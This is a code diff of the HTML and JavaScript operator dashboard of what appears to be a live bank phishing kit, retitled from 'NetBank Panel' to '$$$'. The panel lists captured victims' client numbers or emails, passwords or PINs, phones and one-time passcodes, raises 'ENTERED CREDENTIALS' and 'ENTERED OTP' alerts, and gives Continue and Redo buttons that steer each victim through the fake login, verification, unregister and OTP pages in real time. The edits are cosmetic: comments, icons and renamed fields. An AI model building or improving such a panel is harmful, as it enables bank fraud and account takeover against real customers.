@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>NetBank Panel</title>
+  <title>$$$</title>
   <link rel="preconnect" href="https://rsms.me">
   <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
@@ -46,6 +46,7 @@
       --shadow-color: rgba(0,0,0,0.15);
     }
 
+    /* Theme 1 - Ocean Teal (Default) */
     [data-theme="theme1"] {
       --bg: transparent;
       --card-bg: rgba(20, 40, 60, 0.55);
@@ -68,6 +69,7 @@
       --accent-glow: 0 0 40px rgba(45, 212, 191, 0.3);
     }
 
+    /* Theme 2 - Deep (GREEN) */
     [data-theme="theme2"] {
       --bg: transparent;
       --card-bg: rgba(10, 40, 25, 0.6);
@@ -90,6 +92,7 @@
       --accent-glow: 0 0 40px rgba(34, 197, 94, 0.3);
     }
 
+    /* Theme 3 - Forest (BLUE) */
     [data-theme="theme3"] {
       --bg: transparent;
       --card-bg: rgba(15, 25, 50, 0.6);
@@ -112,6 +115,7 @@
       --accent-glow: 0 0 40px rgba(59, 130, 246, 0.3);
     }
 
+    /* Theme 4 - Magenta Dream (MORE PURPLE) */
     [data-theme="theme4"] {
       --bg: transparent;
       --card-bg: rgba(45, 20, 55, 0.6);
@@ -145,6 +149,7 @@
       position:relative;
     }
 
+    /* Background layers */
     .bg-layer {
       position:fixed;
       top:0;
@@ -162,6 +167,7 @@
       opacity:1;
     }
 
+    /* Glass overlay for better readability */
     .bg-overlay {
       position:fixed;
       top:0;
@@ -373,6 +379,7 @@
     tr.approved{opacity:.6;background:rgba(52,211,153,.03)}
     tr.approved td{color:var(--text-muted)}
 
+    /* Settings styles */
     .settings-row{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid var(--card-border)}
     .settings-row:last-child{border-bottom:none}
     .settings-label{font-size:14px;font-weight:500;color:var(--text-primary)}
@@ -382,6 +389,7 @@
     .theme-option{flex:1;padding:8px 12px;border-radius:8px;border:none;background:transparent;color:var(--text-muted);cursor:pointer;font-size:11px;font-weight:500;transition:all .2s;white-space:nowrap;}
     .theme-option.active{background:var(--card-bg);color:var(--text-primary);box-shadow:0 2px 12px var(--shadow-color);border:1px solid var(--card-border-hover);}
     
+    /* Theme selector grid */
     .theme-grid {
       display:grid;
       grid-template-columns:repeat(4, 1fr);
@@ -424,6 +432,7 @@
     .delete-session-btn{width:100%;padding:12px;border-radius:10px;border:1px solid var(--red);background:rgba(251,113,133,.08);color:var(--red);cursor:pointer;font-size:13px;font-weight:600;transition:all .2s;margin-top:8px;backdrop-filter:blur(10px);}
     .delete-session-btn:hover{background:rgba(251,113,133,.18)}
     
+    /* Confirm modal styles */
     .confirm-text{font-size:14px;color:var(--text-muted);margin-bottom:20px;line-height:1.5}
     .confirm-buttons{display:flex;gap:12px;justify-content:center}
     .confirm-btn{padding:10px 24px;border-radius:10px;border:1px solid var(--card-border);background:rgba(128,128,128,0.08);color:var(--text-primary);cursor:pointer;font-size:13px;font-weight:500;transition:all .2s;backdrop-filter:blur(10px);}
@@ -431,6 +440,7 @@
     .confirm-btn.danger{background:rgba(251,113,133,.12);border-color:var(--red);color:var(--red)}
     .confirm-btn.danger:hover{background:rgba(251,113,133,.22)}
 
+    /* Mobile */
     @media (max-width: 768px) {
       .greet-bar{margin:16px auto 0;padding:0 16px;font-size:16px}
       .dashboard{margin:16px auto 32px;padding:0 16px}
@@ -470,6 +480,7 @@
   </style>
 </head>
 <body>
+  <!-- Background Layers -->
   <div class="bg-layer" id="bg1" style="background-image:url('/images/theme1.jpg')"></div>
   <div class="bg-layer" id="bg2" style="background-image:url('/images/theme2.jpg')"></div>
   <div class="bg-layer" id="bg3" style="background-image:url('/images/theme3.jpg')"></div>
@@ -484,7 +495,7 @@
     </div>
     <div class="greet-right">
       <button id="settingsBtn" class="icon-btn" title="Settings" style="width:auto;height:auto;padding:8px 12px;">
-        <span style="font-size:14px;">⚙️</span>
+        <img src="/images/settings-svgrepo-com.svg" style="width:16px;height:16px;">
       </button>
       <button id="logoutBtn" class="btn">Logout</button>
     </div>
@@ -504,7 +515,7 @@
     <div class="card" style="margin-top:22px">
       <div style="font-size:14px;font-weight:600;margin-bottom:12px">Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:var(--blue);text-decoration:none"></a></div>
       <table id="tbl"><thead><tr>
-        <th>#</th><th>Client Number</th><th>Password</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
+        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
     </div>
@@ -539,11 +550,13 @@
       </div>
       
       <div id="settingsBody">
+        <!-- Current User -->
         <div class="settings-row">
           <div class="settings-label">Current User</div>
           <div class="settings-value" id="settingsUser">admin</div>
         </div>
 
+        <!-- Session Statistics -->
         <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px">
           <div class="settings-label">Session Statistics</div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
@@ -558,6 +571,7 @@
           </div>
         </div>
 
+        <!-- Theme Selection -->
         <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px;">
           <div class="settings-label">Theme</div>
           <div class="theme-toggle">
@@ -565,13 +579,14 @@
             <button class="theme-option" id="themeLight" onclick="setTheme('light')">Light</button>
           </div>
           <div class="theme-grid" id="themeGrid">
-            <div class="theme-thumb" data-theme="theme1" data-name="Aurora" onclick="setTheme('theme1')" style="background:linear-gradient(135deg, #1e3a5f 0%, #2d5a87 100%)"></div>
-            <div class="theme-thumb" data-theme="theme2" data-name="Forest" onclick="setTheme('theme2')" style="background:linear-gradient(135deg, #1a472a 0%, #2d6a4f 100%)"></div>
-            <div class="theme-thumb" data-theme="theme3" data-name="Ocean" onclick="setTheme('theme3')" style="background:linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%)"></div>
-            <div class="theme-thumb" data-theme="theme4" data-name="Dream" onclick="setTheme('theme4')" style="background:linear-gradient(135deg, #581c87 0%, #a855f7 100%)"></div>
+            <div class="theme-thumb" data-theme="theme1" data-name="Aurora" onclick="setTheme('theme1')" style="background-image:url('/images/theme1.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme2" data-name="Forest" onclick="setTheme('theme2')" style="background-image:url('/images/theme2.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme3" data-name="Ocean" onclick="setTheme('theme3')" style="background-image:url('/images/theme3.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme4" data-name="Dream" onclick="setTheme('theme4')" style="background-image:url('/images/theme4.jpg')"></div>
           </div>
         </div>
 
+        <!-- Delete Session -->
         <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px;padding-bottom:0">
           <div>
             <div class="settings-label" style="color:var(--red)">Delete Session</div>
@@ -613,17 +628,27 @@
     }
     
     function setTheme(theme, save = true) {
+      // Remove all theme attributes first
       document.documentElement.removeAttribute('data-theme');
-      document.documentElement.setAttribute('data-theme', theme);
       
+      // Set new theme
+      if (theme !== 'dark' && theme !== 'light') {
+        document.documentElement.setAttribute('data-theme', theme);
+      } else {
+        document.documentElement.setAttribute('data-theme', theme);
+      }
+      
+      // Update UI toggles
       qsa('.theme-option').forEach(el => el.classList.remove('active'));
       const themeBtn = qs(`#theme${theme.charAt(0).toUpperCase() + theme.slice(1)}`);
       if (themeBtn) themeBtn.classList.add('active');
       
+      // Update background layers
       qsa('.bg-layer').forEach((el, i) => {
         el.classList.toggle('active', el.id === `bg${theme.replace('theme', '')}`);
       });
       
+      // Update theme grid selection
       qsa('.theme-thumb').forEach(el => {
         el.classList.toggle('active', el.dataset.theme === theme);
       });
@@ -670,19 +695,19 @@
     /* ----------  ACTIONS  ---------- */
     function actionButtons(s){
       let html = '<div style="display:flex;gap:6px">';
-      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><span style="font-size:16px;">📋</span></button>`;
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
       if (s.page === 'success' || s.status === 'approved') return html + '</div>';
-      if (s.page === 'index.html' && s.entered) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><span style="font-size:16px;">▶️</span></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><span style="font-size:16px;">🔄</span></button>`;
+      if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
       } else if (s.page === 'verify.html' && s.phone) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><span style="font-size:16px;">▶️</span></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><span style="font-size:16px;">🔄</span></button>`;
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
       } else if (s.page === 'unregister.html' && s.unregisterClicked) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><span style="font-size:16px;">▶️</span></button>`;
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
       } else if (s.page === 'otp.html' && s.otp) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><span style="font-size:16px;">▶️</span></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><span style="font-size:16px;">🔄</span></button>`;
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
       }
       return html + '</div>';
     }
@@ -699,9 +724,9 @@
         const old = lastSessions.get(s.sid);
         if (!old) {
           showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
-          if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.clientNumber}`, s.victimNum);
+          if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
         } else {
-          if (!old.entered && s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.clientNumber}`, s.victimNum);
+          if (!old.entered && s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
           if (!old.phone && s.phone) showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
           if (!old.unregisterClicked && s.unregisterClicked) showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
           if (!old.otp && s.otp) showAlert('success', 'ENTERED OTP', `OTP: ${s.otp}`, s.victimNum);
@@ -754,7 +779,7 @@
         return `
         <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
           <td>${s.victimNum}</td>
-          <td><span class="cred">${s.clientNumber||'—'}</span></td>
+          <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
           <td><span class="cred">${s.phone||'—'}</span></td>
           <td><span class="cred">${s.otp||'—'}</span></td>
@@ -806,10 +831,10 @@
           </div>
           <div class="info-section">
             <div class="info-label">Client Number</div>
-            <div class="info-value mono">${s.clientNumber||'—'}</div>
+            <div class="info-value mono">${s.email||'—'}</div>
           </div>
           <div class="info-section">
-            <div class="info-label">Password</div>
+            <div class="info-label">PIN / Password</div>
             <div class="info-value mono">${s.password||'—'}</div>
           </div>
           <div class="info-section">
